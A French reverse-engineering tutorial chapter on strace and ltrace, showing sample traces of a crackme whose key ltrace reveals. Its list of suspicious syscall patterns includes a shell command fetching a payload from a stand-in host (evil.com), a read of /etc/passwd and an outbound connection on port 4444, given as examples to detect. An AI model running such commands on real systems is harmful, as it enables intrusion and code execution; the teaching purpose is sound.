🔝 Retour au [Sommaire](/SOMMAIRE.md)
# 5.5 — `strace` / `ltrace` — appels système et appels de bibliothèques (syscall vs libc)

> **Chapitre 5 — Outils d'inspection binaire de base**  
> **Partie II — Analyse Statique**

---

## Introduction

Jusqu'ici, toutes nos analyses étaient **statiques** : nous avons inspecté le binaire sans jamais l'exécuter. `file`, `strings`, `readelf`, `nm`, `ldd` — tous ces outils se contentent de lire le fichier sur disque. C'est intentionnel : l'analyse statique est sûre et reproductible. Mais elle a une limite fondamentale — elle ne peut pas nous dire ce que le programme **fait réellement** au runtime.

Un binaire peut contenir du code mort, des chemins d'exécution conditionnels, du code déchiffré à la volée, ou des comportements déclenchés uniquement par certains inputs. Pour observer le comportement réel, il faut laisser le programme s'exécuter — sous surveillance.

`strace` et `ltrace` sont des outils de **traçage dynamique** qui permettent d'observer un programme en cours d'exécution sans le modifier et sans utiliser de débogueur. Ils interceptent respectivement les **appels système** (l'interface entre le programme et le noyau Linux) et les **appels de bibliothèques partagées** (les fonctions de la libc et des autres `.so`), et les journalisent en temps réel.

> ⚠️ **Rappel** : contrairement aux outils des sections précédentes, `strace` et `ltrace` **exécutent le binaire**. Ne les utilisez jamais sur un binaire suspect en dehors d'une sandbox isolée (chapitre 26).

---

## Syscalls vs appels de bibliothèques — clarifier la distinction

Avant de plonger dans les outils, il est essentiel de bien comprendre la différence entre ces deux niveaux d'interface, car elle conditionne le choix entre `strace` et `ltrace`.

### Appels système (syscalls)

Un appel système est une requête adressée directement au **noyau Linux**. C'est le seul moyen pour un programme en espace utilisateur d'interagir avec le matériel et les ressources du système : ouvrir un fichier, allouer de la mémoire, communiquer sur le réseau, créer un processus, etc.

Sur x86-64 Linux, un syscall est déclenché par l'instruction machine `syscall`. Le numéro du syscall est placé dans le registre `rax`, et les arguments dans `rdi`, `rsi`, `rdx`, `r10`, `r8`, `r9` (convention différente de l'ABI System V pour les fonctions normales — `rcx` est remplacé par `r10` car `syscall` utilise `rcx` internement).

Il existe environ 450 syscalls sur un noyau Linux récent. Les plus courants en RE sont : `read`, `write`, `open`/`openat`, `close`, `mmap`, `mprotect`, `brk`, `ioctl`, `socket`, `connect`, `sendto`, `recvfrom`, `clone`, `execve`, `exit_group`.

### Appels de bibliothèques (libc et autres)

La grande majorité des programmes ne font **pas** de syscalls directement. Ils utilisent des fonctions de la bibliothèque C standard (libc) qui, en interne, effectuent les syscalls pour eux. Par exemple :

| Fonction libc | Syscall(s) sous-jacent(s) |  
|---|---|  
| `fopen("file.txt", "r")` | `openat(AT_FDCWD, "file.txt", O_RDONLY)` |  
| `printf("Hello %s\n", name)` | `write(1, "Hello World\n", 12)` |  
| `malloc(1024)` | `brk()` ou `mmap()` (selon la taille) |  
| `strcmp(a, b)` | *(aucun — exécution entièrement en espace utilisateur)* |  
| `getaddrinfo(host, ...)` | `socket()`, `connect()`, `sendto()`, `recvfrom()` |

La relation n'est pas toujours un-pour-un. Une seule fonction libc peut engendrer plusieurs syscalls (comme `getaddrinfo` qui effectue des résolutions DNS via des sockets). Inversement, certaines fonctions libc ne font aucun syscall (`strcmp`, `strlen`, `memcpy` — ce sont de pures opérations en mémoire utilisateur).

### Quel outil pour quel niveau ?

| Outil | Ce qu'il intercepte | Niveau | Ce qu'il ne voit pas |  
|---|---|---|---|  
| `strace` | Appels système (`syscall`) | Interface noyau | Fonctions purement userspace (`strcmp`, `strlen`) |  
| `ltrace` | Appels de bibliothèques partagées | Interface libc/.so | Syscalls directs (sans passer par une bibliothèque) |

En pratique, on utilise souvent les deux en complément. `strace` donne la vue « basse » (que fait le programme au niveau OS ?), `ltrace` donne la vue « haute » (quelles fonctions de bibliothèque appelle-t-il et avec quels arguments ?).

---

## `strace` — tracer les appels système

### Principe de fonctionnement

`strace` utilise le mécanisme `ptrace` du noyau Linux — le même que celui utilisé par les débogueurs comme GDB. Il s'attache au processus cible et intercepte chaque transition entre le mode utilisateur et le mode noyau (chaque syscall). Pour chaque appel, il affiche le nom du syscall, ses arguments et sa valeur de retour.

### Utilisation de base

```bash
$ strace ./keygenme_O0
execve("./keygenme_O0", ["./keygenme_O0"], 0x7ffc8a2e0e10 /* 58 vars */) = 0  
brk(NULL)                               = 0x556e3a4c5000  
arch_prctl(0x3001, 0x7ffd1a2c4100)      = -1 EINVAL (Invalid argument)  
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f4a3c8f0000  
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)  
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3  
fstat(3, {st_mode=S_IFREG|0644, st_size=98547, ...}) = 0  
mmap(NULL, 98547, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f4a3c8d7000  
close(3)                                = 0  
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3  
read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0"..., 832) = 832  
[...]
write(1, "Enter your license key: ", 24Enter your license key: ) = 24  
read(0, ABCD-1234-EFGH-5678  
"ABCD-1234-EFGH-5678\n", 1024) = 21
write(1, "Checking key...\n", 17Checking key...
)       = 17
write(1, "Access denied. Invalid key.\n", 28Access denied. Invalid key.
) = 28
exit_group(1)                           = ?
+++ exited with 1 +++
```

La sortie est volumineuse — même ce programme simple génère des dizaines de syscalls. Analysons les phases visibles :

**Phase d'initialisation (loader dynamique)** — les premiers syscalls (`brk`, `mmap`, `access`, `openat` sur `/etc/ld.so.cache` et `libc.so.6`) correspondent au loader dynamique qui charge les bibliothèques partagées. On reconnaît exactement le mécanisme de résolution décrit à la section 5.4 : le loader consulte `/etc/ld.so.cache`, puis ouvre `libc.so.6` et la mappe en mémoire via `mmap`. Cette phase est identique pour tous les binaires dynamiquement liés et peut être filtrée.

**Phase applicative** — c'est là que le programme fait son travail :
- `write(1, "Enter your license key: ", 24)` — écriture sur la sortie standard (fd 1). C'est le `printf` ou `puts` du code source.  
- `read(0, ..., 1024)` — lecture depuis l'entrée standard (fd 0). Le programme attend l'input utilisateur. On voit que le buffer est de 1024 octets.  
- `write(1, "Checking key...\n", 17)` — affichage du message de vérification.  
- `write(1, "Access denied. Invalid key.\n", 28)` — le résultat de la vérification.  
- `exit_group(1)` — le programme se termine avec le code de retour 1 (échec).

Notez que `strcmp` n'apparaît **nulle part** dans la sortie de `strace`. C'est normal : `strcmp` est une fonction purement userspace qui compare des octets en mémoire sans jamais solliciter le noyau. Pour voir `strcmp`, il faut utiliser `ltrace`.

### Format de sortie

Chaque ligne suit un format constant :

```
nom_syscall(arguments...) = valeur_de_retour
```

Quand un syscall échoue, la valeur de retour est `-1` suivie du code d'erreur et de sa description textuelle :

```
access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
```

Les arguments sont affichés sous forme lisible : les flags sont décomposés en constantes symboliques (`O_RDONLY|O_CLOEXEC`), les pointeurs vers des buffers sont suivis de leur contenu entre guillemets, les structures sont développées entre accolades.

### Options essentielles pour le RE

**Filtrer par catégorie de syscalls : `-e trace=`**

La sortie brute de `strace` est souvent noyée dans le bruit de l'initialisation. Le filtrage par catégorie est indispensable :

```bash
# Uniquement les syscalls liés aux fichiers
$ strace -e trace=file ./keygenme_O0
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT  
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3  
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3  

# Uniquement les syscalls réseau (sockets)
$ strace -e trace=network ./binaire_reseau
socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) = 3  
connect(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("192.168.1.100")}, 16) = 0  
sendto(3, "AUTH user123\n", 13, 0, NULL, 0) = 13  
recvfrom(3, "OK\n", 1024, 0, NULL, NULL) = 3  

# Uniquement les syscalls de gestion de processus
$ strace -e trace=process ./binaire
clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|...) = 12345  
execve("/bin/sh", ["sh", "-c", "echo pwned"], ...) = 0  

# Uniquement les syscalls de mémoire
$ strace -e trace=memory ./binaire
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f...  
mprotect(0x7f..., 4096, PROT_READ) = 0  

# Tracer un ou plusieurs syscalls spécifiques
$ strace -e trace=read,write ./keygenme_O0
```

Les catégories de filtrage les plus utiles :

| Catégorie | Syscalls couverts | Cas d'usage RE |  
|---|---|---|  
| `file` | `open`, `openat`, `stat`, `access`, `unlink`… | Quels fichiers le binaire lit/écrit/supprime ? |  
| `network` | `socket`, `connect`, `bind`, `send`, `recv`… | Avec qui communique-t-il ? Sur quel port ? |  
| `process` | `fork`, `clone`, `execve`, `wait`, `kill`… | Crée-t-il d'autres processus ? Exécute-t-il des commandes ? |  
| `memory` | `mmap`, `mprotect`, `brk`, `munmap`… | Comment gère-t-il la mémoire ? Change-t-il les permissions ? |  
| `signal` | `rt_sigaction`, `rt_sigprocmask`, `kill`… | Quels signaux intercepte-t-il ? |  
| `read` / `write` | Littéralement `read` et `write` | Quelles données transitent par les descripteurs de fichiers ? |

**Afficher les chaînes complètes : `-s`**

Par défaut, `strace` tronque les arguments chaîne à 32 caractères. Pour le RE, c'est souvent insuffisant :

```bash
# Augmenter la longueur maximale des chaînes affichées
$ strace -s 256 ./keygenme_O0

# Ou pour ne rien manquer :
$ strace -s 9999 ./keygenme_O0
```

**Mesurer le temps passé dans chaque syscall : `-T` et `-c`**

```bash
# Afficher la durée de chaque syscall (en secondes, entre < >)
$ strace -T ./keygenme_O0
read(0, "test\n", 1024)                 = 5 <4.271282>

# Statistiques agrégées : combien de fois chaque syscall est appelé
$ strace -c ./keygenme_O0
% time     seconds  usecs/call     calls    errors syscall
------ ----------- ----------- --------- --------- ----------------
 42.86    0.000003           1         3           write
 28.57    0.000002           2         1           read
 14.29    0.000001           0         4           mmap
 14.29    0.000001           0         3         1 access
  0.00    0.000000           0         3           close
  0.00    0.000000           0         3           openat
  [...]
------ ----------- ----------- --------- --------- ----------------
100.00    0.000007           0        42         3 total
```

L'option `-c` est particulièrement utile pour obtenir un **profil comportemental** rapide : un programme qui fait des centaines de `sendto`/`recvfrom` est clairement orienté réseau ; un programme avec des milliers de `read`/`write` sur des fichiers fait de l'I/O intensive ; un programme avec beaucoup de `mmap`/`mprotect` modifie ses propres permissions mémoire, ce qui peut indiquer du self-modifying code ou un unpacker.

**S'attacher à un processus déjà en cours : `-p`**

```bash
# Tracer un processus existant par son PID
$ strace -p 12345

# Pratique avec pgrep
$ strace -p $(pgrep keygenme)
```

**Suivre les processus enfants : `-f`**

```bash
# Si le programme fait fork() ou execve(), tracer aussi les enfants
$ strace -f ./binaire_qui_fork
```

Sans `-f`, seul le processus parent est tracé. Les programmes qui se détachent (daemons), qui lancent des commandes shell (`system()`, `execve`), ou qui créent des threads via `clone()` nécessitent cette option.

**Rediriger la sortie vers un fichier : `-o`**

```bash
# La sortie de strace va dans le fichier, la sortie du programme reste visible
$ strace -o trace.log ./keygenme_O0
Enter your license key: test  
Checking key...  
Access denied. Invalid key.  

$ cat trace.log
execve("./keygenme_O0", ["./keygenme_O0"], 0x7ffc... /* 58 vars */) = 0
[...]
```

Sans `-o`, `strace` écrit sur stderr, ce qui se mélange avec la sortie du programme et rend l'interaction difficile. L'option `-o` est quasi-indispensable pour les programmes interactifs.

### Identifier des comportements suspects avec `strace`

En analyse de malware (Partie VI), certains patterns de syscalls sont des signaux d'alerte :

```bash
# Le binaire ouvre des fichiers dans /etc ou /proc
openat(AT_FDCWD, "/etc/passwd", O_RDONLY) = 3  
openat(AT_FDCWD, "/proc/self/status", O_RDONLY) = 4  # anti-debug  

# Le binaire établit une connexion réseau sortante
socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) = 3  
connect(3, {sa_family=AF_INET, sin_port=htons(4444),  
            sin_addr=inet_addr("10.0.0.1")}, 16) = 0

# Le binaire rend une zone mémoire exécutable (unpacking ? shellcode ?)
mprotect(0x7f4a3c000000, 4096, PROT_READ|PROT_WRITE|PROT_EXEC) = 0

# Le binaire supprime des fichiers
unlinkat(AT_FDCWD, "/tmp/evidence.log", 0) = 0

# Le binaire exécute une commande shell
execve("/bin/sh", ["sh", "-c", "curl http://evil.com/payload"], ...) = 0
```

Chacun de ces patterns mérite une investigation approfondie. `strace` les révèle sans aucune connaissance préalable du binaire.

---

## `ltrace` — tracer les appels de bibliothèques

### Principe de fonctionnement

`ltrace` intercepte les appels aux fonctions des bibliothèques partagées — principalement la libc, mais aussi toute autre `.so` liée au binaire. Il fonctionne en instrumentant la PLT (Procedure Linkage Table) : il remplace temporairement les entrées de la PLT par des trampolines qui journalisent l'appel avant de le transmettre à la vraie fonction.

### Utilisation de base

```bash
$ ltrace ./keygenme_O0
puts("Enter your license key: ")                     = 25  
read(0, "ABCD-1234-EFGH-5678\n", 1024)               = 21  
strlen("ABCD-1234-EFGH-5678")                         = 19  
strcmp("ABCD-1234-EFGH-5678", "K3Y9-AX7F-QW2M-PL8N") = -1  
puts("Access denied. Invalid key.")                   = 29  
+++ exited (status 1) +++
```

La différence avec `strace` est immédiatement visible. Là où `strace` nous montrait des `write(1, ...)` et `read(0, ...)` anonymes, `ltrace` nous montre les appels de haut niveau tels que le programmeur les a écrits : `puts`, `strlen`, `strcmp`.

Et surtout — regardez la ligne `strcmp` : `ltrace` affiche les **deux arguments** de la comparaison. On voit que le programme compare l'input utilisateur `"ABCD-1234-EFGH-5678"` avec la clé attendue `"K3Y9-AX7F-QW2M-PL8N"`. En une seule exécution de `ltrace`, sans aucun désassemblage, sans débogueur, sans Ghidra, on a trouvé la clé. Le crackme est résolu.

C'est le pouvoir — et la fragilité — de `ltrace`. Il est dévastateur sur les programmes qui utilisent des fonctions de bibliothèque standard pour leurs opérations sensibles. Mais un programme qui implémente sa propre routine de comparaison (sans appeler `strcmp`) ou qui chiffre ses chaînes en mémoire échappera complètement à `ltrace`.

### Format de sortie

Chaque ligne suit le format :

```
nom_fonction(arguments...) = valeur_de_retour
```

Les arguments sont présentés sous forme lisible : les chaînes sont entre guillemets, les entiers en décimal, les pointeurs en hexadécimal. Les valeurs de retour respectent la sémantique de chaque fonction (`strcmp` retourne 0 si égal, négatif ou positif sinon ; `strlen` retourne la longueur ; etc.).

### Options essentielles pour le RE

**Filtrer les fonctions tracées : `-e`**

```bash
# Tracer uniquement strcmp et strlen
$ ltrace -e strcmp+strlen ./keygenme_O0
strlen("ABCD-1234-EFGH-5678")                         = 19  
strcmp("ABCD-1234-EFGH-5678", "K3Y9-AX7F-QW2M-PL8N") = -1  
+++ exited (status 1) +++

# Tracer toutes les fonctions contenant "str" dans leur nom
$ ltrace -e '*str*' ./keygenme_O0

# Tracer les fonctions d'allocation mémoire
$ ltrace -e malloc+free+calloc+realloc ./programme
malloc(256)                              = 0x556e3a4c5260  
malloc(1024)                             = 0x556e3a4c5370  
free(0x556e3a4c5260)                     = <void>  
```

**Tracer aussi les syscalls : `-S`**

```bash
# Combiner le traçage de bibliothèques et de syscalls
$ ltrace -S ./keygenme_O0
SYS_brk(0)                               = 0x556e3a4c5000  
SYS_mmap(0, 8192, 3, 34, -1, 0)          = 0x7f4a3c8f0000  
[...]
puts("Enter your license key: ")         = 25  
SYS_write(1, "Enter your license key: ", 24) = 24  
SYS_read(0, "test\n", 1024)              = 5  
strlen("test")                            = 4  
strcmp("test", "K3Y9-AX7F-QW2M-PL8N")    = 1  
puts("Access denied. Invalid key.")      = 29  
SYS_write(1, "Access denied. Invalid key.\n", 28) = 28  
```

Avec `-S`, on voit les deux niveaux simultanément : l'appel libc (`puts`) suivi du syscall sous-jacent (`SYS_write`). C'est excellent pour comprendre la correspondance entre les deux couches.

**Afficher les chaînes complètes : `-s`**

```bash
# Comme pour strace, augmenter la longueur maximale des chaînes
$ ltrace -s 256 ./keygenme_O0
```

**Tracer une bibliothèque spécifique : `-l`**

```bash
# Tracer uniquement les appels à libcrypto
$ ltrace -l libcrypto.so.3 ./binaire_crypto
EVP_CIPHER_CTX_new()                     = 0x55a3b2c40100  
EVP_EncryptInit_ex(0x55a3b2c40100, 0x7f..., NULL, "mysecretkey12345", "iv1234567890abcd") = 1  
EVP_EncryptUpdate(0x55a3b2c40100, 0x55a3b2c40200, [32], "plaintext data here!", 20) = 1  
EVP_EncryptFinal_ex(0x55a3b2c40100, 0x55a3b2c40220, [12]) = 1  
```

Cet exemple illustre la puissance de `ltrace` sur un binaire utilisant OpenSSL : on voit la clé de chiffrement, l'IV, et le plaintext en clair dans les arguments. C'est exactement l'information que le chapitre 24 (section 24.3) cherchera à extraire avec des outils plus sophistiqués — mais parfois, `ltrace` suffit.

**Rediriger vers un fichier et suivre les enfants :**

```bash
$ ltrace -o ltrace.log -f ./programme
```

Les options `-o` et `-f` fonctionnent de manière identique à leurs homologues `strace`.

### Limites de `ltrace`

`ltrace` présente plusieurs limitations importantes à garder en tête :

**Binaires statiquement liés** — `ltrace` instrumente la PLT, qui n'existe que dans les binaires dynamiquement liés. Sur un binaire statique, `ltrace` n'intercepte rien.

**Binaires strippés et optimisés** — `ltrace` fonctionne normalement sur les binaires strippés (il instrumente la PLT, qui survit au stripping). En revanche, si le compilateur a inliné des fonctions de bibliothèque (par exemple, GCC peut remplacer `strcmp` par des instructions de comparaison directes à `-O2`/`-O3`), l'appel ne passe plus par la PLT et `ltrace` ne le voit pas.

**Full RELRO** — avec Full RELRO activé, la GOT est en lecture seule après l'initialisation. Certaines versions de `ltrace` peuvent avoir des difficultés avec ce mécanisme, car elles ont besoin de modifier les entrées de la PLT/GOT pour poser leurs hooks. Les versions récentes gèrent généralement ce cas, mais c'est une source potentielle de problèmes.

**Fonctions internes** — `ltrace` ne trace que les appels qui passent par la PLT, c'est-à-dire les fonctions de bibliothèques partagées. Les fonctions définies dans le binaire lui-même (`check_license`, `generate_expected_key`) ne sont pas interceptées. Pour tracer les fonctions internes, il faut un débogueur (GDB, chapitre 11) ou un outil d'instrumentation dynamique (Frida, chapitre 13).

**Compatibilité architecturale** — `ltrace` est moins activement maintenu que `strace` et peut avoir des problèmes sur certaines architectures ou avec certaines versions de glibc. Si `ltrace` produit des résultats incohérents ou segfaulte, essayez Frida comme alternative.

---

## `strace` vs `ltrace` — guide de choix

Le choix entre les deux outils dépend de la question que vous vous posez :

| Question | Outil | Pourquoi |  
|---|---|---|  
| Quels fichiers le programme ouvre-t-il ? | `strace -e trace=file` | L'ouverture de fichier est un syscall (`openat`). |  
| Avec quel serveur communique-t-il ? | `strace -e trace=network` | Les sockets sont des syscalls. |  
| Quelle chaîne est comparée avec l'input ? | `ltrace -e strcmp` | `strcmp` est une fonction libc. |  
| Quelle clé de chiffrement est utilisée ? | `ltrace -l libcrypto*` | Les fonctions OpenSSL sont dans une bibliothèque partagée. |  
| Le programme fork-t-il ? | `strace -e trace=process -f` | `fork`/`clone` sont des syscalls. |  
| Combien de mémoire est allouée ? | `ltrace -e malloc+free` | `malloc` est une fonction libc. |  
| Le programme modifie-t-il ses permissions mémoire ? | `strace -e trace=memory` | `mprotect` est un syscall. |  
| Quels arguments passe-t-il à `printf` ? | `ltrace -e printf` | `printf` est une fonction libc. |

En cas de doute, lancez les deux : `strace -o strace.log` et `ltrace -o ltrace.log` dans deux terminaux (ou l'un après l'autre). Les deux logs se complètent naturellement.

---

## Techniques avancées de traçage

### Capturer les buffers réseau avec `strace`

Pour un binaire réseau, `strace` peut capturer le contenu exact de chaque échange :

```bash
$ strace -e trace=network,read,write -s 4096 -x -o net_trace.log ./binaire_reseau
```

L'option `-x` affiche les chaînes en hexadécimal, ce qui est essentiel pour les protocoles binaires (non-ASCII). On obtient les trames exactes envoyées et reçues, ce qui est le point de départ du reverse de protocole (chapitre 23).

### Compter et profiler les appels

```bash
# Profil statistique des syscalls
$ strace -c ./keygenme_O0 <<< "test"
% time     seconds  usecs/call     calls    errors syscall
------ ----------- ----------- --------- --------- ----------------
  0.00    0.000000           0         3           write
  0.00    0.000000           0         1           read
  0.00    0.000000           0         7           mmap
  [...]

# Profil statistique des appels libc
$ ltrace -c ./keygenme_O0 <<< "test"
% time     seconds  usecs/call     calls      function
------ ----------- ----------- --------- --------------------
 38.46    0.000005           5         1 strcmp
 23.08    0.000003           3         1 strlen
 23.08    0.000003           1         2 puts
 15.38    0.000002           2         1 read
------ ----------- ----------- --------- --------------------
100.00    0.000013                     5 total
```

Les profils `-c` sont un excellent outil de triage pour comprendre le comportement global d'un programme avant de plonger dans les détails.

### Tracer avec des timestamps

```bash
# Timestamp relatif (depuis le début de l'exécution)
$ strace -r ./keygenme_O0
     0.000000 execve("./keygenme_O0", ...) = 0
     0.000412 brk(NULL)                    = 0x556e3a4c5000
     [...]
     0.001523 write(1, "Enter your license key: ", 24) = 24
     4.271282 read(0, "test\n", 1024)      = 5
     0.000089 write(1, "Checking key...\n", 17) = 17
     0.000034 write(1, "Access denied...\n", 28) = 28

# Timestamp absolu (horloge système)
$ strace -t ./keygenme_O0
14:23:45 execve("./keygenme_O0", ...) = 0
[...]

# Timestamp haute précision (microsecondes)
$ strace -tt ./keygenme_O0
14:23:45.123456 execve("./keygenme_O0", ...) = 0
```

Le timestamp relatif (`-r`) est particulièrement utile pour repérer les latences inhabituelles. Un délai de 4 secondes avant le `read` correspond au temps de saisie de l'utilisateur. Mais un délai inexpliqué entre deux syscalls peut indiquer un calcul coûteux, un `sleep` intentionnel (technique anti-debug par timing), ou une attente réseau.

---

## Ce qu'il faut retenir pour la suite

- **`strace` montre l'interface entre le programme et le noyau**. Chaque interaction avec le monde extérieur (fichiers, réseau, processus, mémoire) passe par un syscall que `strace` intercepte. C'est l'outil de choix pour comprendre les effets de bord d'un programme.  
- **`ltrace` montre l'interface entre le programme et ses bibliothèques**. Il révèle les arguments des fonctions de bibliothèque, ce qui est souvent plus lisible et plus directement utile que les syscalls bruts. Sur un crackme naïf, `ltrace` peut résoudre le challenge en une seule exécution.  
- **`strace -e trace=...`** est votre filtre principal. Apprenez les catégories `file`, `network`, `process`, `memory` — elles couvrent 90 % des besoins.  
- **`ltrace -e strcmp`** est le réflexe classique face à un crackme. Si la comparaison passe par `strcmp`, vous verrez les deux chaînes en clair.  
- **Les deux outils exécutent le binaire** — ne les utilisez jamais hors sandbox sur un binaire non fiable.  
- **Les limites** : `strace` ne voit pas les opérations purement userspace ; `ltrace` ne voit pas les syscalls directs ni les fonctions internes. Pour une couverture complète, il faut les compléter par GDB (chapitre 11) et Frida (chapitre 13).

---

> ⏭️ **Prochaine section** : [5.6 — `checksec` — inventaire des protections d'un binaire (ASLR, PIE, NX, canary, RELRO)](/05-outils-inspection-base/06-checksec.md)

⏭️ [`checksec` — inventaire des protections d'un binaire (ASLR, PIE, NX, canary, RELRO)](/05-outils-inspection-base/06-checksec.md)
